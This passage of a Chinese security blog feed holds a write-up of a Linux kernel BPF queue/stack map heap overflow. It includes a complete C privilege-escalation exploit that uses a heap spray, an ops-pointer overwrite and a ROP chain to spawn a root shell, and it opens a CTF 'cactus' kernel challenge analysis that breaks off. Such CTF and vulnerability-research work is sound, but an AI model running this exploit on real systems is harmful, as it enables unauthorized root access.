class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">    err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">             <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">    err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> =</span> bpf_queue_stack(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">  <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">      err = -E2BIG;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">      qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">  <span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">    qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">u32 head, tail;</span><br><span class="line">u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。</p><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  manager;</span><br><span class="line">  data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了<code>attr-&gt;max_entries + 1</code>个，并且每个小块的size为：<code>attr-&gt;value_size</code>。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。</p><p>这里使用到的gadget在 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 中提到过，不熟悉的可以去看看这里就不再赘述。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_pivot_gadget = <span class="number">0xffffffff81954dc8</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pointer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *rop_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = <span class="number">0x17</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">8</span>) = <span class="number">0x40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">12</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">20</span>) = <span class="number">-1</span>;</span><br><span class="line">    res = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;BPF_MAP_CREATE error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, buf, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray finished!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_ops[<span class="number">2</span>] = stack_pivot_gadget;</span><br><span class="line">    pointer[<span class="number">6</span>] = fake_ops;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf = res;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buf + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">16</span>) = pointer;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">24</span>) = <span class="number">2</span>;</span><br><span class="line">    syscall(__NR_bpf, <span class="number">2</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;changed ops\n&quot;</span>);</span><br><span class="line">    rop_addr = mmap(<span class="number">0x81954000</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x6f0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3D40</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81001c50</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff810013b9</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81264e0b</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xFFFFFFFF810E3AB0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff81c00d5a</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0x246</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = <span class="number">0xffffffff8106d8f4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(rop_addr + <span class="number">0x143c</span> + (idx++ * <span class="number">8</span>)) = (<span class="keyword">uint64_t</span>)user_ss;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(<span class="number">0x81954dc8</span>) = <span class="number">0xffffffff81029c71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(victim[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221002145034272.png"                      alt="image-20221002145034272"                ></p><hr><p>参考链接:<a class="link"   href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" >http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目会放在:&lt;a class=&quot;link&quot;   href=&quot;https://github.com/196082/196082&quot; &gt;https://github.com/196082/196082&lt;i class=&quot;fas fa-external-link-alt&quot;&gt;&lt;/i&gt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="bpf" scheme="https://cv196082.gitee.io/tags/bpf/"/>
    
    <category term="堆喷射" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%96%B7%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>ciscn cactus复现</title>
    <link href="https://cv196082.gitee.io/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-09-22T10:17:02.000Z</published>
    <updated>2022-09-23T07:12:41.912Z</updated>
    
    <content type="html"><![CDATA[<p>其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这里想问佬们一个问题，就是为什么这道题不能够同时打开两个设备。因为我最开始的思路就是打开两个设备造成UAF，但是就是打不开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">kernel_open</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(__int64, __int64, __int64))_fentry__)(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !flags )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = kmalloc_caches[<span class="number">8</span>];</span><br><span class="line">    flags = <span class="number">1</span>;</span><br><span class="line">    buffer = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(v3, <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buffer )</span><br><span class="line">      kernel_open_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">kernel_release</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  v2 = addrList;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *v2++ = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != &amp;addrList[<span class="number">0x20</span>] );</span><br><span class="line">  kfree(buffer);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  flags = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这道题的主要函数就是ioctl其余的对做题不影响就不提了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 